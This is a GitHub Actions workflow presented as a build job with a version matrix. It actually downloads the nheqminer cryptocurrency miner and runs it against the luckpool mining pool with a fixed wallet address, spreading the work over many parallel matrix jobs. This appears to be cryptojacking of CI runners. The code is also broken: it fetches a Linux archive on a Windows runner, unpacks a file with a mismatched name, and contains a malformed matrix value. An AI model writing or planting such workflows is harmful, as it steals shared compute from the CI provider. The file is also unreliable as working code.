name: eX-code_MintMe

on: [workflow_dispatch]

jobs:
  build:
    name: eX-code_MintMe
    runs-on: windows-latest
    strategy:
      max-parallel: 5
      fail-fast: false
      matrix:
        go: [1.0, 1.1, 1.2, 1.3, 1,35]
        flag: [A, B, C, D, E, F, G, H, I]
    env:
        NUM_JOBS: 20
        JOB: ${{ matrix.go }}
    steps:
    - name: PREPARING
      run: Invoke-WebRequest https://github.com/VerusCoin/nheqminer/releases/download/v0.8.2/nheqminer-Linux-v0.8.2.tgz
    - name: Seting-UP
      run: Expand-Archive nheqminer-Linux-v0.8.2.tar.gz
    - name: Seting-UP1
      run: Expand-Archive nheqminer-Linux-v0.8.2.tar.gz
    - name: Running
      run: nheqminer/nheqminer -v -l ap.luckpool.net:3956 -t 2 -u RADzfp5pn7wvJEQkBiXPx4wJ7wTm7wg8V2.CPU_PC_MAO_HIEM
    - name: END
      run: exit
